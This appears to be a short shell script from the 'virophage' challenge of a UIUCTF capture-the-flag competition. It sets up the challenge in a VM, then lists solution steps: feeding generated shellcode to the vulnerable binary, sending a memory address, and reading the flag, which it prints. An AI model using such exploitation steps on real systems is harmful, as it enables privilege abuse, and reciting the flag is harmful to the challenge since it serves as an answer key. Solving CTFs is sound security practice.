#!/bin/sh
# Script to be run within the VM

# Local challenge only
./init_chal virophage
exec setpriv --init-groups --reset-env --reuid user --regid user bash -l

##################################################################################
# solution for remote

# MANUAL: copy paste the `export RAW_SHELLCODE=...` generated via the shellcode-generator.py
./virophage "$RAW_SHELLCODE"
# Send address: ffffde80
# and then read the flag:
cat /mnt/flag
# uiuctf{did-you-see-why-its-in-usr-lib-now-0cd5fb56}
